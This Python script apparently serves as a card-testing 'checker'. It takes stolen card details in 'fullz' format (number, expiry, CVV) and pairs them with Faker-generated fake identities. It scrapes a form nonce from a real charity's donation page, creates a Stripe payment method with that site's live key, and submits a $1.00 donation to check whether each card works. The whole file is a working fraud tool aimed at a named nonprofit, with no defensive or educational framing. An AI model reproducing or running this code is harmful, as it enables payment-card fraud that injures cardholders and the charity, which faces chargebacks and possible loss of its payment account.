import re
import uuid
import random
from faker import Faker
import requests

fake = Faker()

def time_page():
    return ''.join(random.choices('0123456789', k=6))

def create_cvv_charge(fullz: str, session: requests.Session):
    """
    Synchronous version of create_cvv_charge using requests.Session
    fullz = 'cc|mes|ano|cvv' string
    """
    try:
        cc, mes, ano, cvv = fullz.split('|')

        agent = fake.user_agent()
        name = fake.first_name()
        email = f"craish{random.randint(548,98698)}niki@gmail.com"
        country = "US"
        city = fake.city()
        address1 = fake.street_address()
        zip_code = fake.zipcode_in_state("TX")
        phone = "+202814880301"  # or generate using Faker if desired
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        ptime = time_page()

        headers_main = {
            'User-Agent': agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

        # 1. GET initial donation page to get tokens and cookies
        resp1 = session.get("https://pipelineforchangefoundation.com/donate/", headers=headers_main, timeout=30)
        text1 = resp1.text

        nonce_match = re.search(r'name="_charitable_donation_nonce" value="(.+?)"', text1)
        form_id_match = re.search(r'name="charitable_form_id" value="(.+?)"', text1)
        if not nonce_match or not form_id_match:
            return "Initialization token missing"

        nonce = nonce_match.group(1)
        form_id = form_id_match.group(1)

        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': agent,
        }

        data_stripe = {
            'type': 'card',
            'billing_details[name]': name,
            'billing_details[email]': email,
            'billing_details[address][city]': city,
            'billing_details[address][country]': country,
            'billing_details[address][line1]': address1,
            'billing_details[address][postal_code]': zip_code,
            'billing_details[address][state]': 'TX',
            'billing_details[phone]': phone,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'referrer': 'https://pipelineforchangefoundation.com',
            'time_on_page': ptime,
            'key': 'pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt'
        }

        resp2 = session.post("https://api.stripe.com/v1/payment_methods", headers=headers_stripe, data=data_stripe, timeout=30)
        resp2_json = resp2.json()

        payment_method_id = resp2_json.get('id')
        if not payment_method_id:
            return resp2.text

        headers_donate = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://pipelineforchangefoundation.com',
            'referer': 'https://pipelineforchangefoundation.com/donate/',
            'user-agent': agent,
            'x-requested-with': 'XMLHttpRequest',
        }

        data_donate = {
            'charitable_form_id': form_id,
            form_id: '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': '690',
            'description': 'Donate to Pipeline for Change Foundation',
            'ID': '0',
            'recurring_donation': 'once',
            'custom_recurring_donation_amount': '',
            'recurring_donation_period': 'once',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': name,
            'last_name': name,
            'email': email,
            'address': address1,
            'address_2': '',
            'city': city,
            'state': 'TX',
            'postcode': zip_code,
            'country': country,
            'phone': phone,
            'gateway': 'stripe',
            'stripe_payment_method': payment_method_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        resp3 = session.post("https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php",
                             headers=headers_donate, data=data_donate, timeout=30)
        return resp3

    except Exception as e:
        return str(e)
